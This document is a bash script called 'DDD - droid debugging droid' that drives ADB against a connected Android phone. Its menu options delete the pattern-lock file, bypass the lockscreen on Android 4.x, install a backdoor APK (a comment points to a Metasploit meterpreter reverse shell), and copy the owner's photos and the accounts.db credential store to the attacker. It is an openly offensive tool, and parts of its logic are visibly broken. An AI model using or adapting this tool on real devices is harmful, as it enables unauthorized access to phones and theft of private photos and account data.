#!/usr/bin/env bash

#   ___  ___  ___  
#  |   \|   \|   \ 
#  | |) | |) | |) |
#  |___/|___/|___/ 
#
# DDD - droid debugging droid               
# Matteo Papa aka xenobyte - xenob8
# based on p2padb by kosborn: https://github.com/kosborn/p2p-adb/
# i had some problems with it so i preffered to write a similar one and in a single bash script

# if you don't get any device connected try restarting your phone!

# CONFIG
# path to the backdoor apk. use this if you want a custom .apk to be installed ( metasploit android/meterpreter/reverse_tcp everyone? )
#backdoor="./files/NAME.apk"


# checks if /data/local/tmp/adb exists. if so delete it and replace with the same binary with right privileges
# this resolves an issue i had with p2padb. i had to remove it manually or i wasn't able to use the framework (file busy)


if [ -e "/data/local/tmp/adb" ]; then
	 rm "/data/local/tmp/adb"
fi
	adbTMP="./files/adb"
	cp ${adbTMP} /data/local/tmp/adb
	adb="/data/local/tmp/adb"
	chmod 777 ${adb}


	echo ""	
	echo "_______________by_xenob8"
	echo ""	
	echo "         Droid "
	echo "       Debugging "	
	echo "         Droid "
	echo "________________________"	


menu(){
	echo ""
	echo " [1] Check privileges"
	echo " [2] Install BusyBox"
	echo " [3] Remove Gesture.key"
	echo " [4] Bypass Lockscreen"
	echo " [5] Install Backdoor"
	echo " [6] Copy photos"
	echo " [7] Retrieve Accounts"
	#echo " [8] "
	#echo " [9] "
	echo ""
	echo " [e] Exit"
	echo ""
	echo "   Selection: "
	echo ""
	read selection

	case $selection in
		1) checkroot; menu;;
		2) busybox; menu;;
		3) gesturerm; menu;;
		4) gesturebypass; menu;;
		5) backdoor; menu;;
		6) camera; menu;;
		7) accounts; menu;;
		#8) function; menu;;
		#9) function; menu;;
		e) quitting; exit;;
		*) menu;;
	esac
}


# function written in p2p adb by kosborn
isRoot(){ 
	WHOAMI=$($adb shell 'id' | tr -d "\r"  )
	TRYROOT=$($adb shell 'su -c "id"' | tr -d "\r" )

	if echo $WHOAMI | grep 'uid=0' 2>&1 >/dev/null 
	then
		[ $1 = 'info' ] && echo "Running as root" 
		[ $1 != 'info' ] && echo 0
	elif echo $TRYROOT | grep 'uid=0' 2>&1 >/dev/null
	then
		[ $1 = 'info' ] && echo "Not natively root." 
		[ $1 = 'info' ] && echo "Will continue to escalate with su." 
		[ $1 != 'info' ] && echo 1
	elif echo $WHOAMI | grep 'uid=2000' 2>&1 >/dev/null
	then
		[ $1 = 'info' ] && echo "Running as shell" 
		[ $1 != 'info' ] && echo 2
	else
		[ $1 = 'info' ] && echo "WHAT AM I???" 
		[ $1 != 'info' ] && echo 3
	fi
}


# check if device is rooted
checkroot(){
	echo "Checking privileges ..."
	rooted=$(isRoot noinfo)
	if [ "$rooted" = "1" ]; then
		echo "Device is rooted"
	fi
	echo "Device is NOT rooted"
	echo ""
}


# install busybox 
busybox(){
	echo "Installing Busybox ..."
	$adb push ./files/busybox /data/local/tmp/busybox
	$adb shell "chmod a+x /data/local/tmp/busybox"
	echo "Done!"
	echo ""
}


# remove gesture 
gesturerm(){
	echo "Checking privileges ..."
	rooted=$(isRoot noinfo)
	if [ "$rooted" = "1" ]; then 
		echo "Removing gesture.key ..."
		$adb shell su -c rm /data/system/gesture.key
		echo "gesture.key Removed!"
		echo ""
	fi
	echo "Device is NOT rooted"
	echo ""
}


# bypass lockscreen ( android v 4.x < 4.4 )
gesturebypass(){
	ver=$adb shell getprop ro.build.version.release
	if [ "$ver" == "4.4" ]||[ "$ver" == "4.4.1" ]||[ "$ver" == "4.4.2" ]||[ "$ver" == "4.4.3" ]||[ "$ver" == "4.4.4" ]||[ "$ver" == "5.0" ]||[ "$ver" == "5.1" ]||[ "$ver" == "5.2" ]||[ "$ver" == "6.0" ]; then
    	echo "version is $ver This Exploit works only for version < 4.4"
			echo ""
			menu
	fi
	echo "Version is $ver . Trying to Bypass the lockscreen"
	$adb shell am start -n com.android.settings/com.android.settings.ChooseLockGeneric --ez confirm_credentials false --ei lockscreen.password_type 0 --activity-clear-task
	echo "Bypassed. If it didn t work, be sure version is 4.x < 4.4 "
	echo ""
	menu
}


# install backdoor 
backdoor(){
	echo "Installing Backdoor ..."
	$adb install $backdoor
	echo "Done!"
	echo ""
}


# pull photos
camera(){
	echo "Copying Photos ..."
	archive="pictures_$(date +%m%d%Y-%H.%M.%S)"
	$adb shell /data/local/tmp/busybox tar -cvf "/sdcard/target.tar" /sdcard/DCIM/ /sdcard/Pictures/ > /dev/null
	$adb pull "/sdcard/target.tar" "./target/$archive/target.tar"
	echo "Done! Photo pull complete. You can find the data in ./target/"
	echo ""
}


# copy accounts info
accounts(){
	rooted=$(isRoot noinfo)
	if [ "$rooted" = "1" ]; then
		echo "Device is rooted. Retrieving accounts.db"
		$adb pull /data/system/users/0/accounts.db ./target/accounts.db
		echo "Done! Accounts.db pulled in ./target/accounts.db"
		echo ""
	else
		echo "Device not rooted"
		echo ""
	fi
}


# quitting
quitting(){
	$adb kill-server
}


menu


